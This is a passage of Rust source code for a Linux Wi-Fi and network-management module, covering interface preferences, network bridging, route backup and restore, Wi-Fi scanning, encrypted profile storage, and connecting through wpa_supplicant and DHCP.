            .any(|s| s.name == candidate && s.ip.is_some())
        {
            return Ok(Some(candidate.to_string()));
        }
    }

    summaries
        .iter()
        .find(|s| s.ip.is_some())
        .map(|s| s.name.clone())
        .or_else(|| summaries.first().map(|s| s.name.clone()))
        .ok_or_else(|| anyhow!("No interfaces available"))
        .map(Some)
}

pub fn read_interface_preference(root: &Path, key: &str) -> Result<Option<String>> {
    let path = root.join("wifi").join("interface_preferences.json");
    if !path.exists() {
        return Ok(None);
    }
    let contents = fs::read_to_string(&path)?;
    let map: Map<String, Value> = serde_json::from_str(&contents)?;
    Ok(map
        .get(key)
        .and_then(|v| v.get("interface"))
        .and_then(|v| v.as_str())
        .map(|s| s.to_string()))
}

pub fn read_interface_preference_with_mac(
    root: &Path,
    key: &str,
) -> Result<Option<(String, Option<String>)>> {
    let path = root.join("wifi").join("interface_preferences.json");
    if !path.exists() {
        return Ok(None);
    }
    let contents = fs::read_to_string(&path)?;
    let map: Map<String, Value> = serde_json::from_str(&contents)?;
    if let Some(entry) = map.get(key) {
        if let Some(iface) = entry.get("interface").and_then(|v| v.as_str()) {
            let mac = entry
                .get("mac")
                .and_then(|v| v.as_str())
                .map(|s| s.to_string());
            return Ok(Some((iface.to_string(), mac)));
        }
    }
    Ok(None)
}

pub fn write_interface_preference(root: &Path, key: &str, interface: &str) -> Result<()> {
    let path = root.join("wifi").join("interface_preferences.json");
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)?;
    }
    let mac = read_interface_mac(interface);
    let mut map: Map<String, Value> = if path.exists() {
        let contents = fs::read_to_string(&path)?;
        serde_json::from_str(&contents).unwrap_or_default()
    } else {
        Map::new()
    };
    map.insert(
        key.to_string(),
        json!({
            "interface": interface,
            "mac": mac,
            "timestamp": Local::now().to_rfc3339(),
        }),
    );
    let json_value = Value::Object(map);
    fs::write(&path, serde_json::to_string_pretty(&json_value)?)?;
    Ok(())
}

pub fn backup_repository(root: &Path, backup_dir: Option<&Path>) -> Result<PathBuf> {
    let dir = backup_dir
        .map(|p| p.to_path_buf())
        .unwrap_or_else(|| PathBuf::from("/root"));
    fs::create_dir_all(&dir)?;
    let ts = Local::now().format("%Y-%m-%d_%H-%M-%S");
    let archive = dir.join(format!("rustyjack_backup_{ts}.tar.gz"));
    let parent = root
        .parent()
        .ok_or_else(|| anyhow!("Root path must have a parent directory"))?;
    let name = root
        .file_name()
        .ok_or_else(|| anyhow!("Root path must end with a directory component"))?;
    Command::new("tar")
        .arg("-czf")
        .arg(&archive)
        .arg("-C")
        .arg(parent)
        .arg(name)
        .status()
        .context("creating backup archive")?
        .success()
        .then_some(())
        .ok_or_else(|| anyhow!("tar command failed"))?;
    Ok(archive)
}

pub fn git_reset_to_remote(root: &Path, remote: &str, branch: &str) -> Result<()> {
    Command::new("git")
        .arg("-C")
        .arg(root)
        .arg("fetch")
        .arg(remote)
        .status()
        .context("git fetch")?
        .success()
        .then_some(())
        .ok_or_else(|| anyhow!("git fetch failed"))?;
    Command::new("git")
        .arg("-C")
        .arg(root)
        .arg("reset")
        .arg("--hard")
        .arg(format!("{remote}/{branch}"))
        .status()
        .context("git reset")?
        .success()
        .then_some(())
        .ok_or_else(|| anyhow!("git reset failed"))
}

pub fn restart_system_service(service: &str) -> Result<()> {
    Command::new("systemctl")
        .arg("restart")
        .arg(service)
        .status()
        .with_context(|| format!("restarting service {service}"))?
        .success()
        .then_some(())
        .ok_or_else(|| anyhow!("systemctl restart failed"))
}

pub fn start_bridge_pair(interface_a: &str, interface_b: &str) -> Result<()> {
    let _ = Command::new("ip")
        .args(["link", "set", "br0", "down"])
        .status();
    let _ = Command::new("brctl").args(["delbr", "br0"]).status();
    for iface in [interface_a, interface_b] {
        Command::new("ip")
            .args(["link", "set", iface, "down"])
            .status()
            .with_context(|| format!("bringing {iface} down"))?
            .success()
            .then_some(())
            .ok_or_else(|| anyhow!("failed to bring down {iface}"))?;
    }
    Command::new("brctl")
        .args(["addbr", "br0"])
        .status()
        .context("creating br0 bridge")?
        .success()
        .then_some(())
        .ok_or_else(|| anyhow!("brctl addbr failed"))?;
    for iface in [interface_a, interface_b] {
        Command::new("brctl")
            .args(["addif", "br0", iface])
            .status()
            .with_context(|| format!("adding {iface} to br0"))?
            .success()
            .then_some(())
            .ok_or_else(|| anyhow!("brctl addif failed for {iface}"))?;
    }
    for iface in [interface_a, interface_b, "br0"] {
        Command::new("ip")
            .args(["link", "set", iface, "up"])
            .status()
            .with_context(|| format!("bringing {iface} up"))?
            .success()
            .then_some(())
            .ok_or_else(|| anyhow!("failed to bring up {iface}"))?;
    }
    Ok(())
}

pub fn stop_bridge_pair(interface_a: &str, interface_b: &str) -> Result<()> {
    let _ = Command::new("ip")
        .args(["link", "set", "br0", "down"])
        .status();
    let _ = Command::new("brctl").args(["delbr", "br0"]).status();
    for iface in [interface_a, interface_b] {
        let _ = Command::new("ip")
            .args(["link", "set", iface, "down"])
            .status();
    }
    Ok(())
}

pub fn backup_routing_state(root: &Path) -> Result<PathBuf> {
    let path = root.join("wifi").join("routing_backup.json");
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)?;
    }
    let routes = Command::new("ip")
        .args(["route", "show"])
        .output()
        .context("backing up route table")?;
    let default_route = read_default_route().unwrap_or(None);
    let mut interfaces = Map::new();
    for iface in ["eth0", "wlan0", "wlan1", "wlan2"] {
        if let Ok(output) = Command::new("ip").args(["addr", "show", iface]).output() {
            if output.status.success() {
                interfaces.insert(
                    iface.to_string(),
                    Value::String(String::from_utf8_lossy(&output.stdout).to_string()),
                );
            }
        }
    }
    let json_value = json!({
        "timestamp": Local::now().to_rfc3339(),
        "default_route": default_route,
        "all_routes": String::from_utf8_lossy(&routes.stdout),
        "interfaces": interfaces,
    });
    fs::write(&path, serde_json::to_string_pretty(&json_value)?)?;
    Ok(path)
}

pub fn restore_routing_state(root: &Path) -> Result<()> {
    let path = root.join("wifi").join("routing_backup.json");
    if !path.exists() {
        bail!("routing backup missing at {}", path.display());
    }
    let contents = fs::read_to_string(&path)?;
    let value: Value = serde_json::from_str(&contents)?;
    let route: Option<DefaultRouteInfo> = value
        .get("default_route")
        .cloned()
        .and_then(|v| serde_json::from_value(v).ok());
    let route = route.ok_or_else(|| anyhow!("backup file missing default route"))?;
    let interface = route
        .interface
        .ok_or_else(|| anyhow!("backup missing interface"))?;
    let gateway = route
        .gateway
        .ok_or_else(|| anyhow!("backup missing gateway"))?;
    let _ = Command::new("ip")
        .args(["route", "del", "default"])
        .status();
    let mut cmd = Command::new("ip");
    cmd.args([
        "route",
        "add",
        "default",
        "via",
        &gateway.to_string(),
        "dev",
        &interface,
    ]);
    if let Some(metric) = route.metric {
        cmd.args(["metric", &metric.to_string()]);
    }
    cmd.status()
        .with_context(|| format!("restoring default route via {interface}"))?
        .success()
        .then_some(())
        .ok_or_else(|| anyhow!("failed to restore default route"))?;
    Ok(())
}

pub fn set_interface_metric(interface: &str, metric: u32) -> Result<()> {
    let gateway =
        interface_gateway(interface)?.ok_or_else(|| anyhow!("No gateway found for {interface}"))?;
    Command::new("ip")
        .args([
            "route",
            "replace",
            "default",
            "via",
            &gateway.to_string(),
            "dev",
            interface,
            "metric",
            &metric.to_string(),
        ])
        .status()
        .with_context(|| format!("setting metric for {interface}"))?
        .success()
        .then_some(())
        .ok_or_else(|| anyhow!("Failed to set metric"))
}

pub fn select_wifi_interface(preferred: Option<String>) -> Result<String> {
    if let Some(name) = preferred {
        return Ok(name);
    }
    let summaries = list_interface_summaries()?;
    if let Some(active) = summaries
        .iter()
        .find(|s| s.kind == "wireless" && s.ip.is_some())
    {
        return Ok(active.name.clone());
    }
    if let Some(any_wireless) = summaries.iter().find(|s| s.kind == "wireless") {
        return Ok(any_wireless.name.clone());
    }
    Err(anyhow!("No wireless interfaces found"))
}

pub fn scan_wifi_networks(interface: &str) -> Result<Vec<WifiNetwork>> {
    // Check permissions first
    check_network_permissions()?;

    // Check if wireless-tools is installed
    let iwlist_check = Command::new("which").arg("iwlist").output();

    if iwlist_check.is_err() || !iwlist_check.unwrap().status.success() {
        log::error!("iwlist not found - wireless-tools may not be installed");
        bail!("WiFi scanning requires wireless-tools package. Install with: apt-get install wireless-tools");
    }

    // Ensure interface is up before scanning
    let up_output = Command::new("ip")
        .args(["link", "set", interface, "up"])
        .output()
        .with_context(|| format!("bringing interface {interface} up before scan"))?;

    if !up_output.status.success() {
        let stderr = String::from_utf8_lossy(&up_output.stderr);
        log::warn!("Could not bring interface up: {stderr}");
    }

    // Give interface time to initialize
    std::thread::sleep(std::time::Duration::from_millis(1000));

    // Verify interface is wireless
    let wireless_check = Command::new("iwconfig").arg(interface).output();

    if let Ok(check) = wireless_check {
        let output_str = String::from_utf8_lossy(&check.stdout);
        if output_str.contains("no wireless extensions") {
            log::error!("Interface {interface} does not support wireless extensions");
            bail!("Interface {interface} is not a wireless interface");
        }
    }

    log::info!("Starting WiFi scan on {interface}...");

    let output = Command::new("iwlist")
        .arg(interface)
        .arg("scan")
        .output()
        .with_context(|| format!("scanning Wi-Fi networks on {interface}"))?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        let stdout = String::from_utf8_lossy(&output.stdout);
        log::error!("WiFi scan failed on {interface}");
        log::error!("stderr: {stderr}");
        log::error!("stdout: {stdout}");

        // Try alternative iw command if iwlist fails
        log::info!("Attempting fallback scan with 'iw scan'...");
        let iw_output = Command::new("iw").args(["dev", interface, "scan"]).output();

        if let Ok(iw_out) = iw_output {
            if iw_out.status.success() {
                return parse_iw_scan(&String::from_utf8_lossy(&iw_out.stdout));
            }
        }

        bail!(
            "WiFi scan failed on {interface}. Check if interface supports scanning and wireless-tools is installed: {stderr}"
        );
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    let mut networks = Vec::new();
    let mut current: Option<WifiNetwork> = None;
    for line in stdout.lines() {
        let line = line.trim();
        if line.starts_with("Cell ") && line.contains("Address:") {
            if let Some(net) = current.take() {
                networks.push(net);
            }
            let mut network = WifiNetwork {
                ssid: None,
                bssid: None,
                quality: None,
                signal_dbm: None,
                channel: None,
                encrypted: true,
            };
            if let Some(addr) = line.split("Address:").nth(1) {
                network.bssid = Some(addr.trim().to_string());
            }
            current = Some(network);
            continue;
        }
        if let Some(net) = current.as_mut() {
            if let Some(idx) = line.find("ESSID:") {
                let essid = line[idx + 6..].trim().trim_matches('"');
                if !essid.is_empty() && essid != "\\x00" {
                    net.ssid = Some(essid.to_string());
                }
            } else if line.contains("Quality=") {
                if let Some(value) = line.split("Quality=").nth(1) {
                    net.quality = value.split_whitespace().next().map(|s| s.to_string());
                }
                if let Some(pos) = line.find("Signal level=") {
                    let value = &line[pos + "Signal level=".len()..];
                    if let Some(level) = value.split_whitespace().next() {
                        let cleaned = level.trim_end_matches("dBm");
                        if let Ok(dbm) = cleaned.parse() {
                            net.signal_dbm = Some(dbm);
                        }
                    }
                }
            } else if line.starts_with("Channel ") || line.starts_with("Channel:") {
                let channel = line
                    .split(|c| c == ' ' || c == ':')
                    .filter_map(|part| part.parse::<u8>().ok())
                    .next();
                if let Some(ch) = channel {
                    net.channel = Some(ch);
                }
            } else if line.contains("Encryption key:") {
                net.encrypted = !line.contains(":off");
            }
        }
    }
    if let Some(net) = current {
        networks.push(net);
    }
    networks.retain(|n| n.ssid.is_some());
    Ok(networks)
}

/// Parse iw scan output as a fallback
fn parse_iw_scan(output: &str) -> Result<Vec<WifiNetwork>> {
    let mut networks = Vec::new();
    let mut current: Option<WifiNetwork> = None;

    for line in output.lines() {
        let line = line.trim();

        if line.starts_with("BSS ") {
            // Save previous network
            if let Some(net) = current.take() {
                networks.push(net);
            }

            // Start new network
            let mut network = WifiNetwork {
                ssid: None,
                bssid: None,
                quality: None,
                signal_dbm: None,
                channel: None,
                encrypted: true,
            };

            // Extract BSSID from "BSS aa:bb:cc:dd:ee:ff(on wlan0)"
            if let Some(bssid_part) = line.split_whitespace().nth(1) {
                let bssid = bssid_part.split('(').next().unwrap_or(bssid_part);
                network.bssid = Some(bssid.to_string());
            }

            current = Some(network);
            continue;
        }

        if let Some(net) = current.as_mut() {
            if line.starts_with("SSID: ") {
                let ssid = line[6..].trim();
                if !ssid.is_empty() {
                    net.ssid = Some(ssid.to_string());
                }
            } else if line.starts_with("signal: ") {
                if let Some(signal_part) = line.split_whitespace().nth(1) {
                    let dbm_str = signal_part.trim_end_matches(" dBm");
                    if let Ok(dbm) = dbm_str.parse::<i32>() {
                        net.signal_dbm = Some(dbm);
                    }
                }
            } else if line.starts_with("freq: ") {
                // Convert frequency to channel
                if let Some(freq_str) = line.split_whitespace().nth(1) {
                    if let Ok(freq) = freq_str.parse::<u32>() {
                        // Simple 2.4GHz channel calculation
                        if freq >= 2412 && freq <= 2484 {
                            let channel = ((freq - 2407) / 5) as u8;
                            net.channel = Some(channel);
                        }
                    }
                }
            } else if line.contains("WPA") || line.contains("RSN") || line.contains("WEP") {
                net.encrypted = true;
            }
        }
    }

    // Save last network
    if let Some(net) = current {
        networks.push(net);
    }

    networks.retain(|n| n.ssid.is_some());
    Ok(networks)
}

pub fn list_wifi_profiles(root: &Path) -> Result<Vec<WifiProfileRecord>> {
    let mut profiles = Vec::new();
    let dir = wifi_profiles_dir(root);
    if !dir.exists() {
        log::info!(
            "WiFi profiles directory does not exist yet: {}",
            dir.display()
        );
        return Ok(profiles);
    }

    log::info!("Loading WiFi profiles from: {}", dir.display());

    let entries = fs::read_dir(&dir)
        .with_context(|| format!("reading profiles directory {}", dir.display()))?;

    for entry in entries {
        let entry = match entry {
            Ok(e) => e,
            Err(e) => {
                log::warn!("Error reading directory entry: {e}");
                continue;
            }
        };

        let path = entry.path();
        if !path.is_file() {
            continue;
        }

        let ext = path.extension().and_then(|s| s.to_str());
        if ext != Some("json") && ext != Some("enc") {
            continue;
        }

        let contents = if ext == Some("enc") {
            match rustyjack_encryption::decrypt_file(&path) {
                Ok(mut bytes) => {
                    let out = match String::from_utf8(bytes.clone()) {
                        Ok(mut s) => {
                            let copy = s.clone();
                            s.zeroize();
                            copy
                        }
                        Err(e) => {
                            log::warn!("Invalid UTF-8 in profile {}: {e}", path.display());
                            bytes.zeroize();
                            continue;
                        }
                    };
                    bytes.zeroize();
                    out
                }
                Err(e) => {
                    log::warn!("Failed to decrypt profile {}: {e}", path.display());
                    continue;
                }
            }
        } else {
            match fs::read_to_string(&path) {
                Ok(mut c) => {
                    let out = c.clone();
                    c.zeroize();
                    out
                }
                Err(e) => {
                    log::warn!("Failed to read profile {}: {e}", path.display());
                    continue;
                }
            }
        };

        match serde_json::from_str::<WifiProfile>(&contents) {
            Ok(profile) => {
                let filename = path
                    .file_name()
                    .and_then(|s| s.to_str())
                    .unwrap_or_default()
                    .to_string();

                log::debug!("Loaded profile: {} from {}", profile.ssid, filename);

                profiles.push(WifiProfileRecord {
                    ssid: profile.ssid,
                    interface: profile.interface,
                    priority: profile.priority,
                    auto_connect: profile.auto_connect,
                    filename,
                    last_used: profile.last_used,
                    created: profile.created,
                });
            }
            Err(err) => {
                log::warn!("Failed to parse Wi-Fi profile {}: {err}", path.display());
            }
        }
    }

    profiles.sort_by(|a, b| {
        b.priority
            .cmp(&a.priority)
            .then_with(|| a.ssid.to_lowercase().cmp(&b.ssid.to_lowercase()))
    });

    log::info!("Loaded {} WiFi profile(s)", profiles.len());
    Ok(profiles)
}

pub fn load_wifi_profile(root: &Path, identifier: &str) -> Result<Option<StoredWifiProfile>> {
    let dir = wifi_profiles_dir(root);
    if !dir.exists() {
        log::warn!("WiFi profiles directory does not exist: {}", dir.display());
        return Ok(None);
    }

    let identifier_lower = identifier.trim().to_lowercase();
    log::info!("Loading WiFi profile for identifier: {identifier}");

    // Try direct filename match first (case-insensitive), support .json and .json.enc
    let sanitized = sanitize_profile_name(identifier);
    let direct_plain = dir.join(format!("{sanitized}.json"));
    let direct_enc = dir.join(format!("{sanitized}.json.enc"));

    for candidate in [&direct_plain, &direct_enc] {
        if candidate.exists() {
            log::info!("Found profile by direct match: {}", candidate.display());
            let contents = if candidate.extension().and_then(|s| s.to_str()) == Some("enc") {
                let mut bytes = rustyjack_encryption::decrypt_file(candidate)
                    .with_context(|| format!("decrypting profile {}", candidate.display()))?;
                let mut s = String::from_utf8(bytes.clone())
                    .with_context(|| format!("utf8 profile {}", candidate.display()))?;
                let out = s.clone();
                s.zeroize();
                bytes.zeroize();
                out
            } else {
                let mut s = fs::read_to_string(candidate)
                    .with_context(|| format!("reading profile from {}", candidate.display()))?;
                let out = s.clone();
                s.zeroize();
                out
            };
            let profile = serde_json::from_str::<WifiProfile>(&contents)
                .with_context(|| format!("parsing profile from {}", candidate.display()))?;
            return Ok(Some(StoredWifiProfile {
                profile,
                path: candidate.to_path_buf(),
            }));
        }
    }

    // Search all profiles for case-insensitive SSID match
    log::info!("Direct match not found, searching all profiles...");
    for entry in fs::read_dir(&dir)
        .with_context(|| format!("reading profiles directory {}", dir.display()))?
    {
        let entry = entry.with_context(|| "reading directory entry")?;
        let path = entry.path();
        if !path.is_file() {
            continue;
        }

        let ext = path.extension().and_then(|s| s.to_str());
        if ext != Some("json") && ext != Some("enc") {
            continue;
        }

        let contents = if ext == Some("enc") {
            match rustyjack_encryption::decrypt_file(&path) {
                Ok(mut bytes) => {
                    let out = match String::from_utf8(bytes.clone()) {
                        Ok(mut s) => {
                            let copy = s.clone();
                            s.zeroize();
                            copy
                        }
                        Err(e) => {
                            log::warn!("Could not parse profile file {}: {e}", path.display());
                            bytes.zeroize();
                            continue;
                        }
                    };
                    bytes.zeroize();
                    out
                }
                Err(e) => {
                    log::warn!("Could not decrypt profile file {}: {e}", path.display());
                    continue;
                }
            }
        } else {
            match fs::read_to_string(&path) {
                Ok(mut c) => {
                    let out = c.clone();
                    c.zeroize();
                    out
                }
                Err(e) => {
                    log::warn!("Could not read profile file {}: {e}", path.display());
                    continue;
                }
            }
        };

        let profile = match serde_json::from_str::<WifiProfile>(&contents) {
            Ok(p) => p,
            Err(e) => {
                log::warn!("Could not parse profile file {}: {e}", path.display());
                continue;
            }
        };

        // Case-insensitive comparison
        if profile.ssid.trim().to_lowercase() == identifier_lower {
            log::info!("Found profile by SSID match: {}", path.display());
            return Ok(Some(StoredWifiProfile { profile, path }));
        }
    }

    log::info!("No matching profile found for: {identifier}");
    Ok(None)
}

pub fn save_wifi_profile(root: &Path, profile: &WifiProfile) -> Result<PathBuf> {
    // Validate profile before saving
    if profile.ssid.trim().is_empty() {
        bail!("Cannot save profile: SSID cannot be empty");
    }

    if profile.ssid.len() > 32 {
        bail!("Cannot save profile: SSID too long (max 32 characters)");
    }

    // Validate interface name
    let interface = profile.interface.trim();
    if !interface.is_empty() && interface != "auto" {
        let valid_chars = interface
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-');
        if !valid_chars {
            bail!("Cannot save profile: Invalid interface name '{interface}'");
        }
    }

    log::info!("Saving WiFi profile for SSID: {}", profile.ssid);

    let dir = wifi_profiles_dir(root);
    fs::create_dir_all(&dir)
        .with_context(|| format!("creating WiFi profiles directory at {}", dir.display()))?;
    harden_dir_permissions(&dir);

    let mut to_save = profile.clone();
    let now = Local::now().to_rfc3339();
    if to_save.created.is_none() {
        to_save.created = Some(now.clone());
    }
    to_save.last_used = Some(now);

    let sanitized = sanitize_profile_name(&to_save.ssid);
    let encrypt_profiles = rustyjack_encryption::wifi_profile_encryption_active();
    if encrypt_profiles && !rustyjack_encryption::encryption_enabled() {
        bail!("WiFi profile encryption is enabled but no key is loaded");
    }

    let filename = if encrypt_profiles {
        format!("{sanitized}.json.enc")
    } else {
        format!("{sanitized}.json")
    };
    let path = dir.join(filename);

    // Remove legacy copy with the opposite extension to prevent stale duplicates
    let legacy = if encrypt_profiles {
        dir.join(format!("{sanitized}.json"))
    } else {
        dir.join(format!("{sanitized}.json.enc"))
    };
    if legacy.exists() {
        let _ = fs::remove_file(&legacy);
    }

    log::info!("Writing profile to: {}", path.display());
    write_wifi_profile(&path, &to_save)
        .with_context(|| format!("writing WiFi profile to {}", path.display()))?;

    log::info!("WiFi profile saved successfully");
    Ok(path)
}

pub fn delete_wifi_profile(root: &Path, identifier: &str) -> Result<()> {
    let dir = wifi_profiles_dir(root);
    if !dir.exists() {
        log::error!("Profile directory does not exist: {}", dir.display());
        bail!("Profile directory missing at {}", dir.display());
    }

    let identifier_lower = identifier.trim().to_lowercase();
    log::info!("Attempting to delete WiFi profile: {identifier}");

    // Try direct filename match first (plain or encrypted)
    let sanitized = sanitize_profile_name(identifier);
    let direct_plain = dir.join(format!("{sanitized}.json"));
    let direct_enc = dir.join(format!("{sanitized}.json.enc"));
    for candidate in [&direct_plain, &direct_enc] {
        if candidate.exists() {
            log::info!("Deleting profile by direct match: {}", candidate.display());
            fs::remove_file(candidate)
                .with_context(|| format!("deleting profile at {}", candidate.display()))?;
            log::info!("Profile deleted successfully");
            return Ok(());
        }
    }

    // Search for case-insensitive match
    log::info!("Direct match not found, searching all profiles...");
    for entry in fs::read_dir(&dir)
        .with_context(|| format!("reading profiles directory {}", dir.display()))?
    {
        let entry = entry.with_context(|| "reading directory entry")?;
        let path = entry.path();
        if !path.is_file() {
            continue;
        }

        let ext = path.extension().and_then(|s| s.to_str());
        if ext != Some("json") && ext != Some("enc") {
            continue;
        }

        let contents = if ext == Some("enc") {
            match rustyjack_encryption::decrypt_file(&path) {
                Ok(mut bytes) => {
                    let out = match String::from_utf8(bytes.clone()) {
                        Ok(mut s) => {
                            let copy = s.clone();
                            s.zeroize();
                            copy
                        }
                        Err(e) => {
                            log::warn!("Could not parse profile {}: {e}", path.display());
                            bytes.zeroize();
                            continue;
                        }
                    };
                    bytes.zeroize();
                    out
                }
                Err(e) => {
                    log::warn!("Could not decrypt profile {}: {e}", path.display());
                    continue;
                }
            }
        } else {
            match fs::read_to_string(&path) {
                Ok(mut c) => {
                    let out = c.clone();
                    c.zeroize();
                    out
                }
                Err(e) => {
                    log::warn!("Could not read profile {}: {e}", path.display());
                    continue;
                }
            }
        };

        let profile = match serde_json::from_str::<WifiProfile>(&contents) {
            Ok(p) => p,
            Err(e) => {
                log::warn!("Could not parse profile {}: {e}", path.display());
                continue;
            }
        };

        if profile.ssid.trim().to_lowercase() == identifier_lower {
            log::info!("Deleting profile by SSID match: {}", path.display());
            fs::remove_file(&path)
                .with_context(|| format!("deleting profile at {}", path.display()))?;
            log::info!("Profile deleted successfully");
            return Ok(());
        }
    }

    log::error!("Profile not found: {identifier}");
    bail!("Profile '{identifier}' not found")
}

pub fn write_wifi_profile(path: &Path, profile: &WifiProfile) -> Result<()> {
    let mut json = serde_json::to_string_pretty(profile)?;
    let encrypt_profiles = path
        .extension()
        .and_then(|e| e.to_str())
        .map(|ext| ext.eq_ignore_ascii_case("enc"))
        .unwrap_or(false)
        || rustyjack_encryption::wifi_profile_encryption_active();

    if encrypt_profiles {
        if !rustyjack_encryption::encryption_enabled() {
            json.zeroize();
            bail!("WiFi profile encryption active but no key loaded");
        }
        let data = rustyjack_encryption::encrypt_bytes(json.as_bytes())?;
        write_private_file(path, &data)?;
    } else {
        write_private_file(path, json.as_bytes())?;
    }
    json.zeroize();
    Ok(())
}

pub fn connect_wifi_network(interface: &str, ssid: &str, password: Option<&str>) -> Result<()> {
    // Check permissions first
    check_network_permissions()?;

    // Validate inputs
    if ssid.trim().is_empty() {
        bail!("SSID cannot be empty");
    }
    if interface.trim().is_empty() {
        bail!("Interface name cannot be empty");
    }

    log::info!("Connecting to WiFi: ssid={ssid}, interface={interface}");

    let rt = tokio::runtime::Runtime::new()
        .with_context(|| "Failed to create tokio runtime for WiFi connect")?;

    // Stop wpa_supplicant if running
    if let Err(e) = rustyjack_netlink::stop_wpa_supplicant(interface) {
        log::warn!("Failed to stop wpa_supplicant for {}: {}", interface, e);
    }
    std::thread::sleep(std::time::Duration::from_millis(500));

    // Release DHCP lease
    if let Err(e) = rt.block_on(async { rustyjack_netlink::dhcp_release(interface).await }) {
        log::warn!("Failed to release DHCP lease for {}: {}", interface, e);
    }
    std::thread::sleep(std::time::Duration::from_millis(100));

    // Reset interface: down, flush, set to station, then up
    log::info!(
        "Resetting interface {} for WiFi connect (down/flush/station/up)",
        interface
    );
    netlink_set_interface_down(interface)
        .with_context(|| format!("bringing interface {interface} down"))?;
    std::thread::sleep(std::time::Duration::from_millis(200));
    if let Err(e) = rt.block_on(async { rustyjack_netlink::flush_addresses(interface).await }) {
        log::warn!("Failed to flush addresses on {}: {}", interface, e);
    }
    {
        let mut wm =
            WirelessManager::new().map_err(|e| anyhow!("Failed to open nl80211 socket: {}", e))?;
        if let Err(e) = wm.set_mode(interface, InterfaceMode::Station) {
            log::warn!(
                "Failed to set {} to station mode via nl80211 (continuing): {}",
                interface,
                e
            );
        }
    }
    netlink_set_interface_up(interface)
        .with_context(|| format!("bringing interface {interface} up"))?;
    std::thread::sleep(std::time::Duration::from_millis(300));

    // Mark interface unmanaged by NetworkManager (best effort)
    if let Ok(nm) =
        rt.block_on(async { rustyjack_netlink::networkmanager::NetworkManagerClient::new().await })
    {
        if let Err(e) = rt.block_on(async { nm.set_device_managed(interface, false).await }) {
            log::debug!(
                "[WIFI] Could not set {} unmanaged via NetworkManager (continuing): {}",
                interface,
                e
            );
        }
    } else {
        log::debug!("[WIFI] NetworkManager not available; continuing with in-process supplicant");
    }

    // Start wpa_supplicant (in-process helper) and connect via WPA control socket
    if let Err(e) = rustyjack_netlink::start_wpa_supplicant(interface, None) {
        log::warn!(
            "[WIFI] Failed to start wpa_supplicant for {}: {}",
            interface,
            e
        );
    }

    let station = StationManager::new(interface)
        .with_context(|| format!("Failed to open supplicant control for {}", interface))?;
    let station_cfg = StationConfig {
        ssid: ssid.to_string(),
        password: password.map(|p| p.to_string()),
        force_scan_ssid: true,
        ..StationConfig::default()
    };

    let outcome = station
        .connect(&station_cfg)
        .with_context(|| format!("Failed to connect to {} via supplicant", ssid))?;
    log::info!(
        "[WIFI] Station connection completed: state={:?} bssid={:?} freq={:?} attempts={} scan_ssid={}",
        outcome.final_state,
        outcome.selected_bssid,
        outcome.selected_freq,
        outcome.attempts,
        outcome.used_scan_ssid
    );

    log::info!("[WIFI] WPA connection successful, requesting DHCP lease...");

    // Request DHCP lease with retry
    let rt = tokio::runtime::Runtime::new()
        .with_context(|| "Failed to create tokio runtime for DHCP acquire")?;
    let mut dhcp_success = false;
    for attempt in 1..=3 {
        let dhcp_result =
            rt.block_on(async { rustyjack_netlink::dhcp_acquire(interface, None).await });

        match dhcp_result {
            Ok(lease) => {
                dhcp_success = true;
                log::info!(
                    "DHCP lease acquired on attempt {}: {}/{}, gateway: {:?}",
                    attempt,
                    lease.address,
                    lease.prefix_len,
                    lease.gateway
                );
                break;
            }
            Err(e) => {
                log::warn!("DHCP attempt {} failed: {}", attempt, e);
            }
        }

        if attempt < 3 {
            std::thread::sleep(std::time::Duration::from_secs(2));
        }
    }

    if !dhcp_success {
        log::warn!("DHCP lease acquisition failed after 3 attempts, but connection may still work");
    }

    log::info!("WiFi connection process completed for {ssid}");
    Ok(())
}

pub fn disconnect_wifi_interface(interface: Option<String>) -> Result<String> {
    check_network_permissions()?;

    let iface = if let Some(iface) = interface {
        iface
    } else {
        auto_detect_wifi_interface()?.ok_or_else(|| {
            log::error!("No Wi-Fi interface found to disconnect");
            anyhow!("No Wi-Fi interface to disconnect")
        })?
    };

    log::info!("Disconnecting WiFi interface: {iface}");

    let rt = tokio::runtime::Runtime::new()
        .with_context(|| "Failed to create tokio runtime for disconnect")?;
    if let Err(e) =
        rt.block_on(async { rustyjack_netlink::networkmanager::disconnect_device(&iface).await })
    {
        log::error!("NetworkManager disconnect failed for {iface}: {e}");
        bail!("Failed to disconnect {iface}: {e}");
    }

    log::info!("Releasing DHCP lease for {iface}");
    let rt = tokio::runtime::Runtime::new()
        .with_context(|| "Failed to create tokio runtime for DHCP release")?;
    if let Err(e) = rt.block_on(async { rustyjack_netlink::dhcp_release(&iface).await }) {
        log::warn!("Failed to release DHCP lease for {}: {}", iface, e);
    }

    log::info!("Interface {iface} disconnected successfully");
    Ok(iface)
}

fn check_network_permissions() -> Result<()> {
    // Check if running as root or with necessary capabilities
    // libc::geteuid is available on Unix only; guard with conditional compilation so
    // this crate can still build on non-Unix hosts (CI, dev machines, editor tooling).
    #[cfg(unix)]
    {
        let euid = unsafe { libc::geteuid() };
        if euid != 0 {
            log::error!("Network operations require root privileges (current euid: {euid})");
            bail!("Network operations require root privileges. Please run as root or with sudo.");
        }
    }

    // On non-Unix platforms the permission check is a no-op — the runtime environment
    // (or platform-specific APIs) should enforce required permissions instead.
    Ok(())
}

/// Cleanup function for graceful WiFi operation failures
/// Attempts to restore interface to a working state after errors
pub fn cleanup_wifi_interface(interface: &str) -> Result<()> {
    log::info!("Performing cleanup for interface: {interface}");

    // Stop wpa_supplicant if running
    if let Err(e) = rustyjack_netlink::stop_wpa_supplicant(interface) {
        log::warn!("Failed to stop wpa_supplicant during cleanup: {}", e);
    }

    // Release DHCP if any
    let rt = tokio::runtime::Runtime::new()
        .with_context(|| "Failed to create tokio runtime for cleanup DHCP release")?;
    if let Err(e) = rt.block_on(async { rustyjack_netlink::dhcp_release(interface).await }) {
        log::warn!(
            "Failed to release DHCP lease during cleanup for {}: {}",
            interface,
            e
        );
    }

    // Ensure interface is up
    let _ = netlink_set_interface_up(interface);

    log::info!("Cleanup completed for {interface}");
    Ok(())
}

fn auto_detect_wifi_interface() -> Result<Option<String>> {
    let summaries = list_interface_summaries()?;
    if let Some(active) = summaries
        .iter()
        .find(|s| s.kind == "wireless" && s.ip.is_some())
    {
        return Ok(Some(active.name.clone()));
    }
    Ok(summaries
        .iter()
